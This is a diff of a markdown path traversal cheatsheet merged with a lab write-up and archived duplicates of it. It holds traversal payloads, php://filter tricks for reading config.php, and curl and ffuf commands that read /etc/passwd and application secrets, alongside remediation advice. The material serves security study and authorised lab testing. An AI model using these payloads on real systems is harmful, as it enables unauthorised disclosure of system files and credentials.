@@ -1,4 +1,59 @@
-# Path / Directory Traversal Cheatsheet
+#Path / Directory Traversal (Canonical)
+
+## Overview
+
+Directory traversal allows reading arbitrary files by escaping intended directories (via `../` or equiv.). It frequently leads to information disclosure (configs, keys, creds).
+
+## When to test
+
+- Any parameter that references file names, downloads, images, or resource loaders (`file=`, `path=`, `/download`, `/get`).
+
+## Detection Checklist
+
+- Try `../etc/passwd`, increase depth, try Windows paths, URL-encode and double-encode sequences, try `php://filter` wrappers.
+- Look for content indicators (`root:`, `.env` keys), content-length jumps, content-type mismatches, or stack traces.
+
+## Tools
+
+- `ffuf`, Burp Suite, `curl`, custom scripts. Use `tools/path_traversal_payloads.txt` for wordlists.
+
+## Payloads / Patterns
+
+- `../../../../etc/passwd`, `..%2f..%2f..%2fetc%2fpasswd`, `php://filter/convert.base64-encode/resource=../../config.php`
+
+## Commands / Quick Examples
+
+- `curl -i "https://target/loadImage?filename=../../../../etc/passwd"`  
+- `ffuf -u "https://target/loadImage?filename=FUZZ" -w tools/path_traversal_payloads.txt`
+
+## Exploitation Primitives
+
+- File disclosure of configs, credentials, logs; potential further pivot if secrets recovered.
+
+## Mitigations / Notes for Reporting
+
+- Canonicalize and resolve paths server-side, enforce allow-lists or mapping IDs → files, and run path normalization checks.
+
+## References
+
+- OWASP, PortSwigger traversal labs.
+
+- PortSwigger: Directory traversal labs
+- OWASP: Path Traversal
+- PHP wrappers: `php://filter` tricks for disclosure
+
+---
+
+- PortSwigger Academy — Directory traversal modules
+- OWASP — Path Traversal
+
+## Detailed Notes / Lab Content
+
+See the extended notes and examples below (original content preserved). Keep long payload lists in `tools/` and lab writeups in `path-traversal/`.
+
+---
+
+## Path / Directory Traversal Cheatsheet
 
 > Quick reference for discovery, payloads, detection, and remediation. Only test on systems you are authorized to assess.
 
@@ -68,9 +123,7 @@ curl -i "https://target/loadImage?filename=../../../../etc/passwd"
 
 - If the server responds with base64 (using php://filter):
 
-```bash
 curl -s "https://target/loadImage?filename=php://filter/convert.base64-encode/resource=../../app/config.php" | base64 -d
-```
 
 ## Fuzzing / automation
 
@@ -109,8 +162,99 @@ ffuf -u "https://target/loadImage?filename=FUZZ" -w path_traversal_payloads.txt 
 - Only test systems you are authorized to test (PortSwigger labs / your own systems). Some encoding/evade payloads can trigger WAFs or cause unexpected behavior.
 - Keep a record of exact request/response pairs for reporting.
 
-## References
+## Lab: Path Traversal — Sample Note
 
-- PortSwigger: Directory traversal labs
-- OWASP: Path Traversal
-- PHP wrappers: `php://filter` tricks for disclosure
+### Target
+- Example: `https://example.com/loadImage?filename=218.png`
+- Parameter: `filename` (GET)
+
+### Summary
+The `filename` parameter in `/loadImage` is a potential path traversal vector. Using directory traversal sequences and PHP stream filters we can test for disclosure of server files.
+
+### Discovery
+1. Observed parameter: `filename=218.png` used to load images.
+2. Injected a traversal probe: `filename=../../../../etc/passwd` and observed a 200 response with `text/plain` content-type containing `root:x:` snippets — confirming traversal.
+
+### Exploitation steps
+1. Basic probe:
+
+```
+GET /loadImage?filename=../../../../etc/passwd HTTP/1.1
+Host: example.com
+
+2. If binary output or filtering prevents plain text, use PHP wrapper to force base64 output:
+
+GET /loadImage?filename=php://filter/convert.base64-encode/resource=../../app/config.php
+
+Then decode locally:
+
+```bash
+curl -s "https://example.com/loadImage?filename=php://filter/convert.base64-encode/resource=../../app/config.php" | base64 -d
+
+### Evidence
+- Paste response excerpts or screenshots here. Keep the exact request with headers.
+
+### Remediation
+- Resolve and canonicalize paths server-side and ensure requested path is under the allowed base directory.
+- Prefer mapping IDs to known filenames instead of accepting raw filenames.
+
+### References
+- PortSwigger Academy — Directory traversal modules
+- OWASP — Path Traversal
+
+## Merged from archive/canonical/path-traversal.md
+
+
+## Path Traversal (Canonical) (archived)
+
+Archived copy of `notes/canonical/path-traversal.md`. Use `notes/path-traversal.md` as the merged single-file topic.
+
+---
+
+## Merged from archive/path-traversal-sample.md
+
+
+## Path Traversal — Sample Note (archived)
+
+(Archived copy of labs/path-traversal-sample.md)
+
+## Target
+
+- Example: `https://example.com/loadImage?filename=218.png`
+- Parameter: `filename` (GET)
+
+## Summary
+
+The `filename` parameter in `/loadImage` is a potential path traversal vector. Using directory traversal sequences and PHP stream filters we can test for disclosure of server files.
+
+## Discovery
+
+1. Observed parameter: `filename=218.png` used to load images.
+2. Injected a traversal probe: `filename=../../../../etc/passwd` and observed a 200 response with `text/plain` content-type containing `root:x:` snippets — confirming traversal.
+
+## Exploitation steps
+
+1. Basic probe:
+
+```
+GET /loadImage?filename=../../../../etc/passwd HTTP/1.1
+Host: example.com
+
+2. If binary output or filtering prevents plain text, use PHP wrapper to force base64 output:
+
+GET /loadImage?filename=php://filter/convert.base64-encode/resource=../../app/config.php
+
+Then decode locally:
+
+```bash
+curl -s "https://example.com/loadImage?filename=php://filter/convert.base64-encode/resource=../../app/config.php" | base64 -d
+
+## Evidence
+
+- Paste response excerpts or screenshots here. Keep the exact request with headers.
+
+## Remediation
+
+- Resolve and canonicalize paths server-side and ensure requested path is under the allowed base directory.
+- Prefer mapping IDs to known filenames instead of accepting raw filenames.
+
